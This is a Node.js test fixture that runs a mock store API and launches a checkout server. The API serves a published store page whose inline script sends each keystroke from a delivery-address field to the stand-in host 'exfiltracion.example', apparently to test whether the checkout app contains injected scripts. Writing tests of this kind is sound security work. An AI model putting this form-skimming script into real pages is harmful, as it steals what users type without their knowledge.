import { createServer } from 'node:http';
import { spawn } from 'node:child_process';

// Public API fixture: load an already-published source revision through the
// real checkout application and production HTTP server, without a database.
const snapshot = {
  schemaVersion: 1,
  brief: {},
  files: [
    { path: 'config.js', content: 'window.PAGOSYA_CONFIG = {};' },
    { path: 'index.html', content: `<!doctype html><html lang="es"><head><title>Tienda de prueba</title></head><body>
      <label>Dirección de entrega <input id="direccion"></label>
      <iframe title="Ubicación del negocio" src="https://www.openstreetmap.org/export/embed.html?bbox=-68.2,-16.6,-68.1,-16.5"></iframe>
      <script src="config.js"></script>
      <script>document.querySelector('#direccion').addEventListener('input', event => {
        window.location.href = 'https://exfiltracion.example/?v=' + encodeURIComponent(event.target.value);
      });</script>
    </body></html>` },
  ],
};

const api = createServer((request, response) => {
  const url = new URL(request.url, 'http://127.0.0.1:4518');
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Content-Type', 'application/json');
  const body = url.pathname === '/v1/stores/public/domain'
    ? { hostname: url.searchParams.get('hostname'), slug: 'seguridad' }
    : url.pathname === '/v1/stores/public/seguridad/seo'
      ? { head: '<title>Tienda de prueba</title>', body: '<h1>Tienda de prueba</h1>' }
      : url.pathname === '/v1/stores/public/seguridad/store'
        ? { storeId: 'store_seguridad', storeName: 'Tienda de prueba', publishedSourceRevision: 1, items: [], categories: [], collections: [] }
        : url.pathname === '/v1/stores/public/seguridad/source-site'
          ? { published: true, snapshot }
          : null;
  response.statusCode = body ? 200 : 404;
  response.end(JSON.stringify(body || { message: 'No disponible.' }));
});

api.listen(4518, '127.0.0.1', () => {
  const checkout = spawn(process.execPath, ['apps/checkout/server.mjs'], {
    stdio: 'inherit',
    env: { ...process.env, PORT: '4517', HOST: '127.0.0.1', CHECKOUT_ORIGIN: 'http://127.0.0.1:4517', INTERNAL_API_BASE_URL: 'http://127.0.0.1:4518/v1' },
  });
  for (const signal of ['SIGINT', 'SIGTERM']) process.on(signal, () => {
    checkout.kill(signal);
    api.close();
  });
  checkout.on('exit', code => { api.close(); process.exitCode = code || 0; });
});
